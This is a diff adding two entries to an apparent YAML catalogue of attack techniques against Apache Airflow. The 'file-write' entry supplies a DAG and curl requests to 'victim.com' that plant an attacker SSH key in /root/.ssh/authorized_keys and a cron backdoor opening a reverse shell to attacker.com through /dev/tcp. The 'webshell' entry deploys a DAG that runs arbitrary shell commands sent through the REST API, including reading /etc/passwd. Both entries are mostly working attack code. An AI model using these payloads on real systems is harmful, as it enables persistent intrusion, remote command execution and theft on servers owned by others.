@@ -107,6 +107,54 @@ functions:
       admin:
       authenticated:
     platform: linux
+  file-write:
+  - code: |
+      # Write arbitrary files to the Airflow host filesystem via a DAG PythonOperator
+      cat > /opt/airflow/dags/filewrite_dag.py << 'DAGEOF'
+      from airflow import DAG
+      from airflow.operators.python import PythonOperator
+      from datetime import datetime
+
+      def write_file(**ctx):
+          path    = ctx['dag_run'].conf.get('path', '/tmp/test.txt')
+          content = ctx['dag_run'].conf.get('content', '')
+          with open(path, 'w') as f:
+              f.write(content)
+
+      with DAG('filewrite', start_date=datetime(2023,1,1), schedule_interval=None,
+               catchup=False) as dag:
+          PythonOperator(task_id='write', python_callable=write_file)
+      DAGEOF
+
+      # Write an SSH authorized_keys file for persistent access:
+      curl -s -X POST "http://victim.com:8080/api/v1/dags/filewrite/dagRuns" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"conf": {
+              "path": "/root/.ssh/authorized_keys",
+              "content": "ssh-ed25519 AAAA...attacker_pubkey... attacker\n"
+            }}'
+
+      # Or write a cron backdoor:
+      curl -s -X POST "http://victim.com:8080/api/v1/dags/filewrite/dagRuns" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"conf": {
+              "path": "/etc/cron.d/backdoor",
+              "content": "* * * * * root bash -i >& /dev/tcp/attacker.com/12345 0>&1\n"
+            }}'
+    comment: |
+      Deploys a PythonOperator DAG that writes arbitrary content to any path
+      writable by the Airflow process user (typically `airflow` in Docker,
+      potentially root in misconfigured deployments). Useful targets:
+      - /root/.ssh/authorized_keys  (persistent SSH access if running as root)
+      - /etc/cron.d/backdoor        (cron-based persistence)
+      - /opt/airflow/dags/<name>.py (inject new DAG code for subsequent RCE)
+      Task logs confirm write success; retrieve via:
+        GET /api/v1/dags/filewrite/dagRuns/<run_id>/taskInstances/write/logs/1
+    contexts:
+      authenticated:
+    platform: linux
   rce:
   - code: |
       # Step 1: write a malicious DAG to the DAGs folder (requires filesystem or Git sync access)
@@ -257,6 +305,39 @@ functions:
       Target cloud IMDS endpoints (AWS 169.254.169.254, GCP metadata.google.internal,
       Azure 169.254.169.254) to retrieve IAM credentials, or probe internal services
       not accessible from the attacker's network.
+    contexts:
+      authenticated:
+    platform: linux
+  webshell:
+  - code: |
+      # Deploy a persistent API-based "webshell" DAG - trigger with cmd, retrieve output from logs
+      cat > /opt/airflow/dags/ws_dag.py << 'DAGEOF'
+      from airflow import DAG
+      from airflow.operators.bash import BashOperator
+      from datetime import datetime
+
+      with DAG('ws', start_date=datetime(2023,1,1), schedule_interval=None,
+               catchup=False) as dag:
+          BashOperator(task_id='cmd', bash_command='{{ dag_run.conf["c"] }}')
+      DAGEOF
+
+      # Execute a command and retrieve output:
+      RUN_ID=$(curl -s -X POST "http://victim.com:8080/api/v1/dags/ws/dagRuns" \
+        -H "Content-Type: application/json" \
+        -u "admin:admin" \
+        -d '{"conf": {"c": "id && hostname && cat /etc/passwd"}}' \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['dag_run_id'])")
+
+      # Retrieve output from task logs (~5 s for task completion):
+      sleep 5
+      curl -s "http://victim.com:8080/api/v1/dags/ws/dagRuns/$RUN_ID/taskInstances/cmd/logs/1" \
+        -u "admin:admin"
+    comment: |
+      Deploys a persistent BashOperator DAG that accepts an arbitrary shell command
+      via the `c` conf key and executes it on the Airflow worker/scheduler host.
+      Output is retrieved from task logs via the REST API, making this non-blind.
+      The DAG persists across Airflow restarts and acts as a durable command
+      execution interface. The shell runs as the Airflow process user.
     contexts:
       authenticated:
     platform: linux
